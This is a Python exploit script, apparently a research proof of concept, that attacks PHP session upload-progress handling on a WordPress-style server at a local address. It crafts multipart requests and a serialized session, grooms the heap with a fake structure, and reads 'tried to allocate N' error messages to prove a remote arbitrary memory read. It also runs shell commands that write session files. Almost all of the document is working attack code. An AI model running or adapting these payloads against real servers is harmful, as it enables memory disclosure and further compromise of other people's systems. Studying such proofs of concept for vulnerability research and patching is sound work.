#!/usr/bin/env python3
"""a3_symmetric.py - the vendor's symmetric design, implemented.

PRODUCER: multipart [PHPSESSID, PROGRESS, PAD(8193B dummy value),
file part] + staged 75MB session file.
  march: temp(pow2 body) -> pad read_body chunk1(2pg)+extend(=3pg hole)
  -> pad copy(3pg) -> read_body FREED -> at FILE_START the decode
  allocates d (emalloc 8216 = 3pg) FIRST-FIT INTO THE PAD'S FREED
  READ_BODY HOLE. d's position = the pad read_body position.

CONSUMER (replay, identical body shape): multipart [PHPSESSID,
PROGRESS, GROOM(8193B fake-d + N-oracle), file part] + token file.
  march: the SAME temp + the groom's read_body chunk1+extend takes
  THE SAME HOLE (the stale child's map is the producer's freed
  footprint; undelivered consumer fires hit fresh children and do not
  touch it) -> THE GROOM LANDS EXACTLY AT d -> the stale walk reads
  our fake-d -> R:1 resolves the oracle zval -> the update encode
  appends *(TARGET) bytes -> "tried to allocate N" IN THE RESPONSE,
  N = *(TARGET). TARGET = basic_globals+0x350 (the stale d pointer)
  -> N == d is the self-verifying arbitrary-qword remote-read proof.
"""
import base64
import os
import re
import struct
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from a2_leak_collect import cexec, helper_scan, stage_session_file  # noqa
from wpbleed import helper_read_pages  # noqa
from a2_groom_roundtrip import fire  # noqa

HOST, PORT = "127.0.0.1", 8099
B = b"WPFIRE"
BG_UNSER_DATA_OFF = 0xF4C020 + 0x350
BIG = 75000000
GROOM_LEN = 8193

def mp_body(sid, special_value):
    """identical shape for producer (pad) and consumer (groom)."""
    parts = (b"--" + B + b"\r\n" +
             b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' +
             sid.encode() + b"\r\n" +
             b"--" + B + b"\r\n" +
             b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n' +
             b"--" + B + b"\r\n" +
             b'Content-Disposition: form-data; name="sp"\r\n'
             b"Content-Type: text/plain\r\n\r\n" + special_value + b"\r\n" +
             b"--" + B + b"\r\n" +
             b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
             b"Content-Type: text/plain\r\n\r\nx\r\n" +
             b"--" + B + b"--\r\n")
    head = (f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {len(parts)}\r\nConnection: close\r\n\r\n"
            ).encode()
    return head + parts

def build_groom(d, target):
    g = bytearray(GROOM_LEN)
    q = lambda off, v: struct.pack_into("<Q", g, off, v)
    dw = lambda off, v: struct.pack_into("<I", g, off, v)
    q(0x00, d + 0x38)
    q(0x08, 0); q(0x10, 0); q(0x18, 0); q(0x20, 0); q(0x28, 0)
    q(0x30, 0x1000)
    dw(0x38, 1)             # used_slots = 1
    q(0x40, 0)
    q(0x48, d + 0x100)      # data[0] -> oracle zval
    q(0x100, target - 0x10) # len will be read at TARGET
    dw(0x108, 0x106)
    dw(0x10C, 0)
    return bytes(g)

def stale_kids():
    kids = helper_scan()
    return [k for k in kids if k["data"] not in (0, None)
            and k["pid"] != "1" and k["level"] not in (0, None)]

def main():
    # 1. symmetric producers: poison the whole pool (pad-shaped)
    print("[*] poisoning the pool with symmetric producers (pad shape)...")
    for i in range(6):
        sidA = "wp36A" + uuid.uuid4().hex[:24]
        assert stage_session_file(sidA)
        fire(mp_body(sidA, b"P" * GROOM_LEN))
    kids = stale_kids()
    print(f"[*] stale pool: {len(kids)} -> {[(k['pid'], hex(k['data'])) for k in kids[:3]]}")
    if not kids:
        print("[-] no stale children"); return 1
    d = kids[0]["data"]
    biases = {k["pid"]: k["bias"] for k in kids}
    bias = kids[0]["bias"]
    target = bias + BG_UNSER_DATA_OFF
    expected = d
    print(f"[+] d=0x{d:x}  TARGET=basic_globals+0x350  expected N={expected}")

    # verify d's uniformity across the pool
    if len(set(k["data"] for k in kids)) != 1:
        print(f"[!] d not uniform: {[hex(k['data']) for k in kids]} - using the first")

    groom = build_groom(d, target)

    # 2. replay consumers
    wins = 0
    for i in range(14):
        if not stale_kids():
            print("[-] pool drained before a win; repoison + rerun")
            break
        sidB = "wp36B" + uuid.uuid4().hex[:26]
        t64 = base64.b64encode(b"k|a:1:{i:0;R:1;}").decode()
        cexec(f"echo {t64} | base64 -d > /tmp/sess_{sidB}; "
              f"chown www-data:www-data /tmp/sess_{sidB}; chmod 600 /tmp/sess_{sidB}")
        resp = fire(mp_body(sidB, groom))
        body = resp.partition(b"\r\n\r\n")[2]
        m = re.search(rb"tried to allocate (\d+)", body)
        if m:
            n = int(m.group(1))
            if n == expected:
                wins += 1
                print(f"  [{i}] *** N==d ORACLE: N={n} (0x{n:x}) ***  "
                      f"REMOTE ARBITRARY-QWORD READ PROVEN", flush=True)
                break
            print(f"  [{i}] N={n} (0x{n:x})"
                  f"{' (memory-derived foreign!)' if n not in (75000032, 434176, 2097152, 134217728) else ' (staged)'}",
                  flush=True)
        elif len(resp) == 0 or resp == b"<RESET>":
            print(f"  [{i}] crash (delivered; groom or fake-d still off)", flush=True)
        else:
            print(f"  [{i}] normal({len(resp)}) - not delivered", flush=True)
    return 0 if wins else 1

if __name__ == "__main__":
    sys.exit(main())
